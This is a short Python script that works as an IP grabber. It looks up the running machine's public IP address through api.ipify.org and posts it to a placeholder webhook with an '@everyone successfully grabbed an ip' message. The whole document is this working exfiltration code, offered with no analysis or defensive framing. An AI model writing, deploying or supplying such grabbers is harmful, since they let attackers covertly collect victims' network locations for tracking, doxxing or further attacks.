import requests

def get():
    getip = requests.get('https://api.ipify.org?format=json')
    ip_data = getip.json()
    return ip_data['ip']

def send(webhook, ip):
    payload = {'content': f'@everyone successfully grabbed an ip: {ip}'}
    requests.post(webhook, json=payload)

if __name__ == "__main__":
    webhook = 'webhook url'
    ip = get()
    send(webhook, ip)
